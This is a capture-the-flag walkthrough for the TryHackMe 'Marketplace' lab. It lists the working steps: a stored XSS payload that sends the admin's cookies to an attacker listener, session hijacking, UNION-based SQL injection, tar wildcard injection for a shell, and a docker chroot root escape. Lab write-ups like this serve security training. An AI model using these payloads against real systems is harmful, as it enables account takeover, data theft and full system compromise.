# - MARKET PLACE WRITEUP- #

1. Find all ports
    - `sudo nmap -sS 10.10.213.65`
    - Notice 22 and 80 are open

2. Find and subdomains open with dirb
    - `dirb http://IP /usr/share/wordlists/dirb/common.tx`

3. See that website accepts xss attack and that someone from there will review it when reported
Make listing
    ```JS
    <script>alert('xss');</script>
    ```

4. Start up listening server
    - `python3 -m http.server`

5. Go to website and submit some nasty cookie collecter
    ```JS 
    <script>document.location="http://THM_IP:8000/?c="+document.cookie;</script>
    ```

6. Then go to http://BOX_IP/report/3 (or whatever number the ID of the item is) and report it

7. Now go to http://10.10.92.114/admin and in storage change cookie token to the collected one from michael
8. Now you should be logged in as michael and should see first flag

9. Clicking on user can see url becomes  
    - http://10.10.92.114/admin?user=25
    - can add
    - http://10.10.92.114/admin?user=25password=
    - and see we no have an SQL injection error

10. We can do http://10.10.92.114/admin?user=25 UNION SELECT * FROM users.
We are interested in `http://10.10.92.114/admin?user=25%20UNION%20SELECT%201,GROUP_CONCAT(message_content),3,4%20FROM%20marketplace.messages`

11. Now ssh into jake@BOX_IP and we can see user.txt using @b_ENXkGYUCAv3zJ as password

- Check for SUID
    - `find / -perm /6000 -type f -executable 2>/dev/null`
- SEE WHAT WE CAN RUN AS SUDO
    - `sudo -l`
- run things as michael
    - `sudo -u michael /opt/backups/backup.sh`


12. `tar cf backup.tar * ` will run anything after the star

13. so make two files after looking at tar SUID for sudo in https://gtfobins.github.io/gtfobins/tar/
- file 1: --checkpoint=1 
- file 2: --checkpoint-action=exec=/bin/sh
- can make them by going to vim and doing :wq filename

14. run command as michael and you open shell as michael, do bash for bash shell
`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
